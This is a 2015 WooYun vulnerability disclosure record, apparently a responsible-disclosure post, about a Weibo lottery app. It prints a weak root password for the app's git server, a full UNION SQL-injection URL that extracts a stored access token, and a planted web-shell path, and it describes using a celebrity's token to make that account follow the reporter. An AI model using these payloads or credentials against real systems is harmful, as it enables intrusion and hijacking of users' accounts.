{"id": 45914, "wybug_id": "wooyun-2015-093434", "wybug_title": "我是如何让周鸿祎/王思聪等关注我微博的", "wybug_corp": "dripower.com", "wybug_author": "Noxxx", "wybug_date": "2015-01-23 15:17", "wybug_open_date": "2015-03-09 15:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-09：\t细节向公众公开  简要描述： rt 详细说明：  其实不止是关注，获得微博用户的授权source和access_token就能干很多事相关api文档：http://open.weibo.com/wiki/%E5%BE%AE%E5%8D%9AAPI如果 微博用户授权了某应用 而某应用被黑客攻击的话。获取到access_token危害将是很大的。下面就来说个 微博上很多人用的 一款应用 ： 转发抽奖平台。影响很多用户：挑几个有名的王思聪周鸿祎百度卫士回忆专用小马甲等等.....-------------------------------------------------------http://judge.drip.im/.git/config 可以使用 rip-git.pl进行下载源码。不过由于下载速度太慢就把git服务器搞了：git.jilen.orgroot密码为弱口令：zhengjiao打包了分抽奖平台的源码回来看看，里面有好几发注入（包括thinkphp框架出的注入），还有 源码一些权限判断不严谨 只是做了 header转跳后没有exit;注入：http://judge.drip.im/honor/?t=12_04 where 0 UNION(SELECT * FROM ((SELECT 24894)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g JOIN (SELECT 8)h JOIN (SELECT token from token where account_id=1708942053 limit 1)i JOIN (SELECT 10)j JOIN (SELECT 11)k JOIN (SELECT 12)l JOIN (SELECT 13)AA JOIN (SELECT 14)AB JOIN (SELECT 15)AC JOIN (SELECT 16)AD JOIN (SELECT 17)AE JOIN (SELECT 18)AF JOIN (SELECT 19)A1 JOIN (SELECT 20)A2 JOIN (SELECT 21)A3 JOIN (SELECT 22)A4 JOIN (SELECT 23)A5 JOIN (SELECT 24)A6 JOIN (SELECT 25)A7 JOIN (SELECT 26)A8 JOIN (SELECT 27)A9))%23查询周鸿祎得到token。使用weibo的关注api即可http://open.weibo.com/wiki/2/friendships/create测试完已经 取关注了。   漏洞证明：  \n\n同服shellhttp://jilen.org/wp-includes/css/media-foo.php\n\n   修复方案：  打包回来的源码已经删除。删除git目录,密码应该更换更安全的密码。token不知道是不是必须要存储的?对应微博用户来说,授权应用需谨慎。   版权声明：转载请注明来源 Noxxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-23 15:20 厂商回复： 确认漏洞，马上修复，非常感谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-23 09:47 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  微信？居然不给腾讯？    \n     2015-01-23 10:18 |    \t\tNeeke \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:24        | 求传授刷Rank方法？)\t\t \n  牛逼    \n     2015-01-23 10:22 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:33        | 哎)\t\t \n  不是新浪？ 厂商？    \n     2015-01-23 10:55 |    \t\tKamiSama \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | talk is cheap, show me your code！)\t\t \n  cctv拍这里    \n     2015-01-23 11:04 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  求粉 - -     \n     2015-01-23 13:21 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  对比下周鸿祎和王思聪的微博关注 就知道楼主是谁了    \n     2015-01-23 13:33 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:33        | 哎)\t\t \n  @p.z 机自啊！！！ 还是pz聪明    \n     2015-01-23 14:41 |    \t\t有一种精神叫helen \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:22        )\t\t \n  @p.z 你好机制    \n     2015-01-23 14:42 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  这是啥产品    \n     2015-01-23 16:16 |    \t\t呆子不开口 \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:25        | 求各种兼职)\t\t \n  sql注入拿到该公司的抽奖平台的微博授权token？    \n     2015-01-23 16:18 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:33        | 哎)\t\t \n  app真是乱 可以强迫别人关注自己。。。    \n     2015-01-26 11:57 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  @p.z 。。。。    \n     2015-03-12 01:17 |    \t\tJumbo小号 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | Jumbo小弟，我们兄弟遍布五湖四海。。。)\t\t \n  流弊    \n     2015-06-29 17:44 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  @呆子不开口 预测帝    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}